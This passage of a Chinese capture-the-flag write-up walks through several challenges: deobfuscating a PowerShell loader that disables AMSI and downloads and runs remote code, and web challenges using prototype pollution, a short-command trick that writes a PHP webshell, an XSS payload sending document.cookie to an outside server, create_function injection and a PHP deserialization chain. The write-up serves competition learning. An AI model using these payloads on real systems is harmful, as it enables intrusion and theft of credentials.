+bA4Kmf1CIf/7jPw==
```

先base64，再inflate，得到以下代码：

![image-20231015233615158](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015233615158.png)

```
set-alias -Name httpCurl -Value iex;[Byte[]]$c = [System.Convert]::FromBase64String('BSQiIklEakUoWC0nLCwnLlZASFxJKSQiJW0/aCUiG0BHXTxkTTxxIyMbKXckGyQbJBskNCssJysrLSc0MSwnLzEnMS4nMTAnLi4sJy4vLCcxMywnNC0tJy4rLScxLicuLS0nKzAnMi4sJy0vGxtAZigbG2JpRG1vbkBNcF5gTihqT09tYHFpaj53Ijg8YlU8Xj88Yz1MSjxMPzx1PGJUPDw/PGQ9clQ8PD88dDxiSDxEPzxkPUxIPEg/PCw8PEk8VD88dDxySDxMPzxjPTxKPEA/PHM8TFU8RD88aD1iSDxMPzxnPUxJPFA/PHI8PEg8TD88LDw8STxMQjwsPHJIPF4/PC48PEg8PD88KzxiSTxePzxlPTxIPGI/PHQ8Ykk8SD88MDxySTxmPzwrPDxVPFA/PGY9PEo8Yj88Zj1MSjw8PzxzPDxVPERCPHM8PFU8REI8LDxiSDxMQjwvPExKPGY/PHU8PEo8Zj88ZD1MSTxIQjxjPUxKPGY/PGU9ckg8TEI8ZT08SDxQQjxnPTxKPFQ/PGM9YlQ8QD88Yz1MVTxmPzxlPTxJPEQ/PGU9ckg8VD88ZT08VTxMPzxzPHJJPFRCPGc9TEk8Zj88dTxiSTxEPzwtPHJIPFQ/PGY9PEo8REI8Zz1ySTxUQjxkPWJJPEA/PGU9Ykg8UEI8KzxMVDxAQjwwPDxKPEA/PCw8TFQ8Xj88dTxiSDxiPzxnPXJUPERCPDA8Ykg8RD88LTxySDxEPzx1PExKPGI/PGQ9TEo8TD88LDxySDxQQjxjPXJJPEhCPHQ8TEg8QD88LTxiSTxePzwrPHJJPF4/PCw8ckk8QD88KzxMSDxIPzxyPDxKPFBCPDA8clQ8PD88Kzw8SDxAPzx1PExIPDw/PHQ8TEo8SD88ZT1ySTxAPzwvPDxJPEQ/PCs8Ykk8REI8Yz1MSDxMQjxyPDxVPEw/PCs8TFQ8PD88Zj08VTw8PzwrPExJPEg/PGY9ckg8PD88ZD08STxQQjxyPExVPGY/PGY9clQ8QD88LDxiVDxMPzwvPGJUPEQ/PC08TFQ8REI8Lzw8SDxIPzwvPDxJPEA/PC48PEo8RD88LDw8STxEPzwrPExKPEBCPDA8TFU8Xj88KzxiSTxmPzx1PGJJPFA/PCs8PEo8SEI8ZD1iVDxIPzx1PDxVPEhCPGg9TEo8Zj88KzxySTxIQjxyPDxKPGI/PHQ8TEg8VD88ZD1iSTxePzxyPDxIPFQ/PCs8PEo8Xj88Zz1MVTxMQjwrPExJPExCPC88TFQ8VEI8dTxiSDw8PzwrPGJVPFRCPGM9TFU8UD88dTxMVDxQQjxkPWJJPFBCPDA8PEk8SEI8MDxMSTxIQjxlPUxVPExCPGU9ckg8Xj88cjxiSTxIQjx0PDxJPERCPHI8YlQ8Yj88LzxiVTxUPzwwPGJVPFBCPCw8TEo8QEI8MDw8SDxEPzwwPGJVPEhCPGU9TFU8Yj88LDxiVDxMPzxoPXJUPFRCPC88TEg8PD88Yz1ySTxUQjwuPHJUPFQ/PC08PEg8VD88aD1MVDxQPzx1PDxKPFQ/PDA8TEg8Yj88LjxMSjxAQjxmPTxIPFQ/PC88YlU8UEI8Yz08VTxUQjxjPXJIPEw/PCs8TFU8SD88ZT1MSjxMQjxmPXJUPEhCPC88TFQ8QD88MDw8SDxiPzx0PDxJPExCPCs8TEo8REI8LjxiVTxUQjx1PDxVPEBCPCs8ckg8TD88LjxiSTw8PzwuPDxKPGI/PHQ8Ykk8Zj88dDxiVTxMPzxmPWJVPGI/PHI8Ykg8TEI8Lzw8SjxIPzxjPXJIPEhCPHM8YlU8QEI8ZD1iSTxQQjx0PGJJPGI/PGY9TEk8SEI8czxMVTxQQjwsPGJUPFBCPHQ8TFU8UD88cjw8SDxiPzx1PGJIPEQ/PGY9Ykg8SD88dTxiSTxAPzxnPUxIPERCPC48YlU8QD88ZD08STxMQjwwPExJPFBCPGc9ckg8QEI8Zj1iVTxePzxnPXJIPEBCPHQ8YlU8TD88Zz1MSDw8PzxnPTxVPDw/PGc9Ykk8VD88Yz08SDxiPzx1PExVPDw/PCw8PEo8VD88dTw8STw8PzwuPDxKPFQ/PGg9Ykk8VD88aD1MVTxIQjx1PExKPEA/PC48TEk8REI8dDw8STxQQjwrPDxKPEQ/PGM9PEg8Xj88LTxiSDxIQjwuPHJIPEw/PHU8TFU8Xj88LzxyVDw8PzxkPWJUPFRCPC48YlQ8VEI8LDxiSDxIQjwwPGJUPERCPHQ8clQ8UEI8czxMVDxUQjwtPDxVPEg/PGM9clQ8UEI8Zz1iSDxiPzwuPExUPDw/PCw8ckk8VD88dDw8SDxUQjwwPDxKPFRCPGg9TEo8Xj88ZD08STxEPzxnPTxJPDw/PGc9YlU8REI8dTxySTxUQjxlPTxJPGI/PGg9clQ8Yj88LjxiVTxePzxnPXJIPEg/PHI8PEo8Yj88Lzw8VTxQQjxkPWJJPEBCPC08TEo8UD88LzxySDxMQjxmPUxUPExCPGY9Ykk8TD88MDxMSTxAQjxyPGJVPExCPHU8TEg8TD88dTxiVDxAPzwvPExVPFA/PC88TFQ8VEI8LjxMSDxQPzwtPDxJPEhCPGU9TEo8TD88LDxyVDxEPzwvPExIPEg/PHU8PFU8QEI8MDw8SjxQPzx0PHJJPGI/PGY9TEg8TD88dDw8STxePzxmPWJVPExCPGY9Ykk8SEI8cjw8SjxQQjwuPGJIPEA/PHQ8YlQ8SD88LTxMVTxUQjwsPExIPFQ/PHI8PEo8Xj88LzxMVTxIQjwsPExJPERCPGM9Ykg8VEI8ZD1MSjxQPzxyPExJPEBCPGg9ckg8SD88ZD1iVDxEQjwrPGJVPEBCPGQ9PEk8UEI8Yz08SDxAPzxzPHJUPGY/PHI8YlQ8QD88dDxMSDxiPzwwPHJUPFBCPC88Ykk8QD88aD1ySDxiPzxjPWJVPEQ/PC48PEk8Yj88dTxMSTxUPzxyPExVPEBCPHI8clQ8PD88ZD1iSDw8PzxzPHJJPDw/PGU9TFQ8REI8LTxyVDxMQjxyPDxJPEQ/PGU9ckg8VEI8dTxMSjxMQjxoPTxIPEA/PC08PEk8Yj88KzxyVDxIQjxoPUxKPExCPHQ8TEo8UEI8cjxySTxAQjxzPGJVPEQ/PHM8ckk8SD88LzxMSDxiPzx0PDxJPEBCPHQ8clQ8PD88dTxMSTxiPzxzPHJUPEhCPCw8ckg8Xj88dDxMSDxmPzx1PExJPF4/PCw8ckk8Yj88LDxiSTxMQjwvPDxJPExCPHI8PEg8QEI8Yz1MVDxePzxlPTxKPEQ/PHU8ckk8REI8ZD1ySTxMQjx0PGJIPExCPC08YlQ8VEI8Yz1ySTxmPzxnPUxJPGY/PGQ9TEo8SD88Zj1ySDxAQjxlPTxKPFBCPHM8PEg8UD88MDw8VTxMPzx0PDxIPEQ/PHM8PEo8RD88Yz1MVTxmPzwtPGJUPEA/PGM9YlU8PD88ZT1yVDxQQjwsPDxIPEw/PGg9Ykg8QD88Zz1iVDxUPzx0PExIPGY/PCs8ckg8UD88MDxiVTxEPzxkPTxVPGY/PGg9YlU8SEI8ZT1iSTxAPzwtPGJJPFA/PGU9TEo8UD88ZT1MSjxAPzxnPTxIPDw/PGM9TEg8Zj88LTxMSTxIPzxjPWJIPFBCPC48YlQ8SD88aD1MSjxAPzxyPGJIPERCPGc9TEk8QEI8Zz08SDxmPzwuPExIPERCPCw8PFU8REI8aD1MSjxAPzxmPUxUPEBCPCw8Ykg8UEI8aD08STxmPzxyPDxIPFQ/PGU9TEg8REI8LTxMVTxmPzxmPWJVPDw/PC88ckk8Yj88LjxySDxAPzxjPWJJPEQ/PGQ9TEo8RD88cjxMSTxmPzwrPDxVPExCPCs8ckg8QD88ZD1MSjxUQjwwPDxVPFA/PC48Ykk8SD88Kzw8SjxMPzxyPGJIPDw/PC88PEg8VD88Zz08SDw8Pzx1PGJVPEBCPHM8ckk8RD88czxMVDxIQjxkPUxJPFA/PGU9Ykg8QD88cjxMVTxIPzxzPHJJPExCPCs8ckk8VD88Zj1iVDxIQjx0PHJIPERCPGc9TFQ8Zj88czw8STxQQjwrPDxVPF4/PCs8TEg8TD88czxySTxUQjxmPWJVPGY/PC48ckg8PD88aD08VTxQPzx1PHJJPEw/PGY9ckk8Xj88MDxySTxAQjwvPHJIPDw/PHM8TEg8TEI8LzxiVTxEPzwuPExUPEA/PGM9ckk8Yj88KzxiVDxMPzxyPDxKPGY/PGg9ckk8UEI8Zj1MSTxePzx0PHJJPEA/PGQ9ckg8PD88czxiVTxQQjwrPHJJPFBCPGg9PEg8VEI8LTxiSDxEQjwtPDxVPExCPHU8PEo8UEI8Zj1MVDw8PzwwPHJIPFBCPGg9YlQ8QD88aD1MVTxMPzxyPHJUPEA/PC88TEk8UEI8aD1MVDxMPzxjPXJIPERCPC08clQ8UEI8czxiSDxMQjwwPHJJPEg/PC48PEk8ckM8NDxMSzxAQDw9PWJQPERCPGM9PFU8UEE8MDxyTzxUQDxxPExOPHJCPEc9Yl48QEA8MD1iUjxuQjxzPExSPGJCPDM9YkgwLy4wXCswKzEsXS4sLy4tLythLi8yMSwsLF8tNC8xMiIjHyNEbmk8PkpHZ1xnXD1qR0JKT2JJRG1PbmBtcF5AbjU1WEc8Q25tPEgpbmA+ZFFNQG5ram1AT2lEKWBoZG9JcG1WI2ROaVxCaURtb25KT21PSzU1WGc8Y25tPEgpTkA+RFFNYE5rak1gb2lkKUBoZG9pUE1WGyM=');[Byte[]]$d = [System.Convert]::FromBase64String('amNga0xga'+'mQ4JWVmYGtYZGZrbDgl'+'a2VcZFxeWGVYRCVkXGtqcEo=');[Byte[]]$e = [System.Convert]::FromBase64String('W1xjY'+'Fg9a2BlQGBqZFg=');[Byte[]]$f = [System.Convert]::FromBase64String('XGlmO'+'iVkXGtqcEo=');[Byte[]]$g = [Convert]::FromBase64String('aVxbYG1ma'+'UdrZVxtPCVeZWBrZVxtPCVqW'+'mBramZlXlhgOyVkXGtqcEo=');[Byte[]]$h = [System.Convert]::FromBase64String('W1xjW'+'VhlXFZk');[Byte[]]$i = [Convert]::FromBase64String('aVxbYG1maUde'+'ZkNuazxKRyVeZWBaWGlLJWV'+'mYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=');[Byte[]]$j = [Convert]::FromBase64String('aVxbY'+'G1maUdua1w=');function A ([Byte[]]$v,[Int]$n){[Byte[]]$t = $v.clone();Set-Variable -Value (1) -Name aaa;for (Set-Variable -Value (0) -Name x; $x -lt $v.Count; $x++) {Set-Variable -Name aaa -Value (2);$t[$v.Count-$x-1] = $v[$x] + $n;}return $t;}Set-Variable -Name y -Value (1);while($y -gt 0){Set-Variable -Name c -Value (A($c)(5));Set-Variable -Value (A($d)(9)) -Name d;Set-Variable -Value (A($e)(9)) -Name e;Set-Variable -Value (A($f)(9)) -Name f;Set-Variable -Value (A($g)(9)) -Name g;Set-Variable -Value (A($h)(9)) -Name h;Set-Variable -Value (A($i)(9)) -Name i;Set-Variable -Value (A($j)(9)) -Name j;Set-Variable -Name y -Value ($y - 1);}Set-Variable -Name cccccc -Value ([System.Text.Encoding]::ASCII.GetString($c));[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString($d)).GetField([Text.Encoding]::ASCII.GetString($e),'NonPublic, Static').SetValue($null, $true);if($y -lt 1000){httpCurl($cccccc);}
```

代码太多了，但是中间大部分都是base64的加密码。由于数量太多，我的想法是让它自己解密。方法就是去掉iex执行就可以。（就是得到本来的字符串，而不当作命令执行）。

阅读代码发现第一行`set-alias -Name httpCurl -Value iex;`语句将httpCurl设置为iex的别名，这里我们在脚本中找到后将其去除：

![image-20231015234057341](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234057341.png)

发现这里包裹着`$cccccc`变量，这里我们肯定不能将变量一起删了。就在上一行，我们发现cccccc也是别名：

```powershell
Set-Variable -Name cccccc -Value ([System.Text.Encoding]::ASCII.GetString($c));
```

那干脆把这个别名也去了，将`([System.Text.Encoding]::ASCII.GetString($c))`，放入最后的`if`语句中：

```powershell
if($y -lt 1000){[System.Text.Encoding]::ASCII.GetString($c);}
```

此时这个文件应该没有iex了，运行一下试试看：

![image-20231015234453555](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234453555.png)

又得到一堆代码：

```powershell
([RUntimE.inteRopSeRVICES.MArshAl]::PTrTOstrInGanSi([ruNtime.InTEropsERViCes.MArsHAL]::sEcuresTrINgTOGLoBalalLOCAnsI($('76492d1116743f0423413b16050a5345MgB8AGgAWQAxAGsAWgB5AEEAcgBLAGwASQAvAEYATwA5AFUAZABhAGIAUgBBAEEAPQA9AHwANAA3ADMANwA5AGQAMgAxAGUAYwA2AGIAMwBhADQAYQBmAGUANQA4ADEAYwAwADQAZQBmADEAYgBmAGUAMwA5ADAAYQBkAGUAOAAzAGQAZAA2AGIAMgA2AGYAMABmAGUANwA0AGUAZgAxADAAMwBiADEANwAyADcANQBkAGUANwBmADkAOAAwADQAYgA0ADgANwBhADEAYQA3ADIAZgA4AGQAMQAxADAAMwA4AGEANwA5ADcANwBkADQANwAzADUAZABmADAAMwA3ADkAZgBkAGYANwAxADQAMQA0ADcAZAA0AGUANAAxADkAYQBlAGIAMwAyAGMAYgBkADYANwA0AGQANwAxADMAZQAwADEAMgBjADUANQBiAGMAYQAxADIANwAxAGEAZgAzADAAMABlADYAMAA4ADAAMgAwADQAOAA0ADMANgA3ADUAZAA5AGYAOQBiADEAMwA0AGQAZAA0ADkANQAwADIAOQBiADIANgBhADEAMwA3ADgANwA4ADAAZgBkADkAZQA2AGIAMQBjADYAMAAwADkANABmAGUAMgA1AGEAYQBkADEAOQBmAGIAZAA1AGIAMQA3ADkAMABlAGEANQBlAGIAMgAwADEAOQBmADMAYgA3AGUAMgBhADMANQA2ADkAMQBhADAAMABlADEAOQBjADUAOQBjADUANgA2ADEANgBjAGMAZgBmADkAZABiADIAZgA5ADUAMwA0ADkAMQAyADYAYgBlADEAMgBmADQAMAA1AGUAYwBjADAAZgBhADEAYgA2ADkAZQBhADIAOAAxADIAMAAyADQAZAA5ADUAMAAxAGUAOABjAGEAMwBkADMAOQBiADkANQBlADkANwBhAGYAYgA2AGQAMgAyAGQANwBiAGIANwAzADIAOABjADcAYQBhAGEAMAAwAGQANAA4AGQANgA1ADgANwA1ADcANQAzADkAMQAyADcAMwA1AGMAYwAxADgANQAzADAAYwAyAGEANAAyADgAMQA4ADMANwAxADIAZgAxAGEANwAwAGUAOQAyAGQAOQBmAGMAYwA0ADgANAA2ADEAMABmAGQAOQAzAGYAMwBjADIANAAwAGQAYwA2AGIAYQBjADAANwAxADAAMgBiADAAYwAwAGEAZQAwADYANQAzADgANAA3ADIAZgBhADgAMwBmADEANgA4AGUAYwA5ADgAMQAyADEAYgAwADkAYwAxADEAMABhAGUANABiAGEAZgA0AGIAYgBiADMAMwBmAGEANQAwADUAOQBiAGYAMgBhAGIANQA1AGMAZQA4ADcAOAAwADYAMQA1AGYAZQA2ADMAYgAyADEAMgA3AGUAOAAwAGMANgBkAGQAZgBkADcANAAyADQAMQBkADgANwAyADUAOAA5AGEAZAAzADMAMQA4ADIAYwA1ADQAOQBjAGMANAA2ADUAMQA3AGYAYQA4ADUAZQA4ADEAYgAzADQAMQAzAGQAZgAwAGEANQA5ADQANgBkAGQAYQBkAGQAMwA4ADUAOQA2AGEANgBiAGUAZAA4ADgAOAAwADMAMwBlADcAZgA3ADgAYwBmADgANABjAGYANwAzAGIAZgBlADAANABlADIANABiADcAOQBmAGYAOAA5AGYAMAAyADYANwA1ADAAYQA3ADgAMgBlAGUAYwBhADMAZAA2AGYAYQAxAGUAYwAyAGIAYgA5AGMAMgA1AGYAYgA3AGYAYgBiADAAYwA4ADcAZQAzADQAMwA3AGMAMgA2ADcAMABhADIAOAA0AGUANAAyAGIANQA3ADEAOQAzAGMAZQBmADYANgBmADYAOAA3ADAANAAzADYAOAA1ADAAZQAzADgAMABhADYANgBlADAAZABlADAAMQBlADQAZgAyAGEAMwBlADcAZgBkAGEAMwBlAGUANQA5AGQANABiADEAZgA3AGIAMQBlADEANgAzADMAMgBkADIAMgAzADgAMAAwADUAZQAyAGUAYgA1AGUAZQAxAGMANQBkADgANgAyAGUANgBiAGEAZgAxAGMAMwBhADMAOAA4AGQAMgAwADgAZgBkADQAZgAyADkANgAyADgAOAA3ADAANgA3ADQAMwA0AGEAZAAzAGYAZgA3AGIAOQA0AGQANAAyADgAMAA5ADEAYQA4AGMAYwBkAGQAOQBjADMAZQA0ADQAMwBhAGYAZABhAGUAZgA4ADYAMABkAGEAOQA3ADgAMQA5ADYAOAAzADUAYQBmADYAMAA2ADYAYwA3AGYANwBhADAAMQA4AGYAYwBmADQAYgA1ADgAZQBjAGMAZgA5ADIAMAA5AGEAOQA1AGUAZgA5ADYAZgA4ADgAYgAwAGIANAAyAGMANgAwADcAMwBjAGQAZQBjAGMANQA5AGMANAA5AGUANgBiAGUAYQAzADUAZQBhAGYAZgA0ADAAMgAzAGYAYQA4AGQANQA0AGQAZQBlADcAOAA0ADYAMAAwADcANgBiADYAMQAyADgAOAAwAGMANwA0ADkAOQBmAGMAZAAzADMAYgBiAGMAOAA0ADUANgAzADkANgA0ADcAZQA5AGEAOQA0ADIANAA1ADIAOAA3ADEANAA4ADMAMAA4AGIAYQA2ADIAYgA4ADQAYgA1ADEAYwBkADkAZQAwAGUANABiADAAMwBkADMANQA0ADAAZABkADAAYQA0ADQAZAAwAGQAMQBhAGIANgA0ADIANAA4ADEANwBjADMAOQAyADAAMQAzADEAMAA0ADAAYwA5AGUAOAAwADMAMQA0ADEANwA1ADcANwA0ADcANgA2ADEAMQAyAGMANwBhAGUAMwA1ADQAOQBiADgAOQAzADIAMwA2ADIAMgA5AGIAYwBlADgAMgAzADcAYQA1ADEAOAA5AGEAYQA0AGUAMgBjADEANgBiAGYANwBlAGIAOABkADYAMwA2ADIANgAzADkANQBlAGYANwAxADQAZABjADYAMwBjADIANABjADkAZQBhADEAYgBhADYAOABlAGUAMABjAGQAMwBjADkAOQBhAGMANQBiADkAOAAzADkAOQA4AGQAMgA1AGIAZAAxAGIAZAAxADAAOQBkADgAOABkADUAZAA0ADkANwA5ADMANgAyADgAMABjADcANgA0ADAAMAA3ADcAMwA1AGQANAA1ADQAMAAwADUANQBlADQAMgBmADIAZQAxADEAOABhADQAMwAyADYANAA1ADMAMQBiADIAMgAyADAAYwBiADAAYgAzADQAOQBhADcAZgA='|ConverTTo-SecuREstrIng  -kE  42,137,50,223,36,203,229,186,143,133,56,36,64,169,200,109) ) ) )|. ((vARiAbLE '*mDr*').NaME[3,11,2]-JoIN'')
```

虽然还是很长，但是结构比上一个要清晰。我们发现第一个管道符`|`前面的都是加密的字符串，后面的`ConverTTo-SecuREstrIng`应该是字符串的转化操作（不知道是干什么的），第二个管道符后面还有一串不知道的东西，运行一下：

![image-20231015234740264](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234740264.png)

看都不用看，直接删了。然后带着第一个管道符一起执行。结果如下：

![image-20231015234916981](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234916981.png)

```powershell
$a=(("{10}{0}{3}{21}{9}{15}{5}{6}{20}{12}{7}{8}{17}{18}{19}{11}{13}{1}{14}{16}{2}{4}"-f'/www','ss_verr','esti','.ctf.com?S','ng}','h','ell_','ion_','isss','=susctf{Pow','https:/','sss','scat','sssss','rry_','erS','inter','ssss','s','s','Deobfu','US'))(New-Object Net.WebClient).DownloadString($a)|iex
```

哈哈，flag已经初见形状。这里只有一个变量`$a`，手解似乎也行。但是看到了一个大大的iex。直接删了执行：

![image-20231015235115096](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235115096.png)

似乎`(New-Object Net.WebClient).DownloadString($a)`影响了执行。那么一起删了：

![image-20231015235231158](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015235231158.png)

成功得到flag。

# Web

## 0x01 pollute me

首先，根据题目的提示，该题目可能是一个nodejs原型链污染的题目。

原型链污染常常发生的地点是两个对象合并的时候。当相互合并的变量中有一个变量可控，我们就可以将`__proto__`赋值给合并的对象，从而造成原型链污染。

由于js对象之间存在继承关系，所以当我们要使用或者输出一个变量就会通过原型链向上搜索，当上层没有就会再向上上层搜索，直到指向 null，若此时还未找到就会返回 undefined。当我们成功加入`__proto_`的时候，就会影响所有来自于这个原型的对象。

直奔主题，审计app.js。这里直接找到了merge函数：

![image-20231016091430092](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091430092.png)

同时也找到了使用Merge函数的地方：

![image-20231016091452796](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016091452796.png)

merge的第二个参数`req.body`显然是我们可控的。只要在请求体中放入键值对应的json就可以实现污染。注意这里需要有个前提，就是结构体中的username字段必须等于存在的username（就是你注册的那个username）。

我们直接开始实操，首先需要注册用户：

 ![image-20231016092636045](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092636045.png)

这里为了方便将两个名字全部设为一样的。

接下来直接去修改信息。但是为了能修改请求体的内容（而且网页中并没有给我们提供修改username的接口），这里还是选择抓包：

![image-20231016092853450](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016092853450.png)

将请求体改为：

![image-20231016093530806](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093530806.png)

原因是我们需要在eval中进行命令执行，参数就是eval_item：

![image-20231016093320507](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093320507.png)

这里提交修改，发现“姓名更新成功”后才能进行下一步（eval只有一次机会）。然后就直接访问/eval：

![image-20231016093735696](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093735696.png)

就可以看到flag了。

## 0x02 PHP Is All You Need

![image-20231016093823510](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016093823510.png)

审计代码发现，接受的cmd参数可以直接命令执行，但是要求是字符小于20。

首先用ls看一下：

![image-20231016113951973](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113951973.png)

发现光flag文件的名称都14个字符了，再加上两个引号和括号和一个分号都21个字符了。很显然不能满足题目要求。

这里有几个技巧：

+ Linux可以用`\`拼接命令
+ 可以用 `ls -t`按照时间顺序，后执行的排前面，于是可以拆分命令再拼接来实现。

+ 可以用 `ls -th`，`-h` 不影响执行，但 `ht-` 就能排到 `sl` 前面去

这里的想法是写入一句话木马`<?php eval（$_GET[1]);`到`1.php`中。

因为有不少标点符号，这里直接用base64编码，为`PD9waHAgZXZhbCgkX0dFVFsxXSk7`

写入的命令是：`echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php`

这里我们需要用拼接符号连接，同时需要按照时间倒序排列，才能`ls -t`到正常的顺序。

最后`ls -t >0`写入到0这个文件中，然后`sh 0`执行0即可。

于是payload为：

```
>hp
>1.p\\
>d\>\\
>\ -\\
>e64\\
>bas\\
>7\|\\
>XSk\\
>Fsx\\
>dFV\\
>kX0\\
>bCg\\
>XZh\\
>AgZ\\
>waH\\
>PD9\\
>o\ \\
>ech\\
ls -t>0
sh 0
```

依次输入执行20个命令，使用`ls`看一下：

![image-20231016113711078](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113711078.png)

发现1.php已经写入服务器，此时直接访问1.php，然后命令注入即可：

![image-20231016113844061](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113844061.png)

查看源码，发现flag：

![image-20231016113906319](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016113906319.png)

## 0x03 Lavish Pastebin

这题进去随便输入内容，发现html直接加载了原内容。于是怀疑是XSS。

这里输入`<script>alert(1);</script>`试一试，确实可以。

![image-20231016103404256](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103404256.png)

但是根据源码，发现加载了CSP策略。

![image-20231016103459992](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016103459992.png)

这里的`script-src`是`unsafe-inline`，即代表可以加载内联的Javascript。

于是想到了window.location。这里由于xss平台不支持直接接受http请求数据，我选择在自己的vps上用nc监听。（ip隐藏了，效果如下所示）

payload如下所示：

```
<script>
location.href="http://49.51.**.***:8080/?f="+encodeURIComponent(document.cookie);
</script>
```

这里发现一个问题，就是执行完这个payload发现下面提交给机器人的按钮没有了。于是选择抓提交机器人的包，然后将含有payload的pastebin直接发送给机器人：

```
POST /report HTTP/1.1
Host: game.ctf.seusus.com:31471
Content-Length: 35
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://game.ctf.seusus.com:31471
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36 Edg/118.0.2088.46
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://game.ctf.seusus.com:31471/paste/850ab8e7f7f1bc71c5219903ef6099cf
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Connection: close

id=f17835c73eced2b97b2ebc4f75b4abb2
```

将上方id换成含有payload的pastebin给机器人即可。

此时在服务器端等待，即可收到flag：

![微信图片_20231016105020](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20231016105020.png)

## 0x04 why not play a game

题目提示得到最高分的时候即可获得flag，这里猜测flag可能就存在在js文件中。

![image-20231016105210317](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016105210317.png)

搜索susctf即可找到flag。

## 0x05 easy_rce

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!empty($_GET)){
    foreach ($_GET as $key=>$value){
        $key("",$value);
    }
}
```

看了下题目，实际上是可变变量的问题。在php中可变变量可以当作函数名来执行。

这里由于要求的参数第一位是""，可供选择的函数很少。这里有一个函数是：create_function

这个函数存在一个漏洞，就是代码注入的问题：

create_function()会创建一个匿名函数（lambda样式），同时create_function()函数会在内部执行 eval()，我们发现是执行了后面的return语句，属于create_function()中的第二个参数string $code位置。该函数即等价于下面的情况。

![6](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/6.png)

于是可以直接使用如下payload进行闭合，从而实现任意命令执行：

```php
create_function=return%20111;}...//
```

这里我是直接写入木马：

```php
create_function=return%20111;}fputs(fopen('shell.php','w'),'<?php @eval($_POST[cmd]);?>');//
```

这时直接用蚁剑连shell.php即可。

连接后在根目录发现flag。可是由于权限是700根本无法查看。

这里找了好久，终于在/tmp下找到了一个mycat程序，使用命令`mycat /flag`才可以读取flag中的文件。

![image-20231016110259303](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110259303.png)

![image-20231016110228445](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110228445.png)

## 0x06 sleep away

看见题目就知道是反序列化的题目。

![image-20231016110343705](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016110343705.png)

这里发现注入点在safeeval中的`__destrcut`函数中，他会在对象销毁的时候自动执行。但是，命令执行的参数args_down会在反序列化wakeup的时候被清空为空数组。

于是这里想到要绕wakeup。这里常用的方法是修改对象中参数的个数为不合法的个数。但是试了一下发现根本没用，因为此时destruct也不执行了。

此时发现helper中的wakeup具有修改内容的功能。而且我们知道，当类嵌套类的时候，内部类的wakeup会先触发。这里我的思路就是evalsafe在内部，让其wakeup先修改args_down,然后将helper的youneed绑定（引用）到safeeval类的args_down上，通过turearg（不是truearg）修改args_down参数即可。

于是payload如下所示：

```php
<?php
highlight_file(__FILE__);
class safeeval{
    public $evalstr;
    public $args_down;

    function __construct ($e,$arg){

        $this->evalstr=$e;
        $this->args_down=$arg;

    }
    function __destruct()
    {
        $evalstr=(string)$this->evalstr;
        $evalstr($this->args_down);
    }

    function __wakeup(){
        echo 'eval wakeup';
        $this->args_down=[];
    }
}
class helper{
    public $youneed;
    public $turearg;
    public $thinkit;

    function __wakeup()
    {
        echo "helper wakeup";
        $this->youneed=$this->turearg;
    }
}
if($_GET['step1']==md5($_GET['step1'])){
    echo "zhi shi xue bao";
    unserialize($_GET['backdoor']);
}
else{
    echo "xue bao bi zui";
}

$a = new helper();
$b = new safeeval('system','ls'); 
$a->thinkit = &$b;
// var_dump($a->thinkit);
$a->youneed = &$b->args_down;
// var_dump($a->youneed);
// $a->turearg = 'ls /';
$a->turearg = 'cat /f1agggg';


echo serialize($a);
?>
```

这里将thinkit绑定`$b`只是为了方便测试，其实可以不绑定的，得到的结果就是：

```php
O:6:"helper":3:{s:7:"youneed";s:2:"ls";s:7:"turearg";s:12:"cat /f1agggg";s:7:"thinkit";O:8:"safeeval":2:{s:7:"evalstr";s:6:"system";s:9:"args_down";R:2;}}
```

哦对这里还有个md5的问题，由于php的弱类型比较特性，我们可以使用字符串开头为'0e'的md5值来绕过判定。这里存在一个自身和md5的开头都是0e的字符串，他就是:

```payload
0e215962017
```

填入step1即可完成。找到的flag如下：

![image-20231016114619400](https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231016114619400.png)

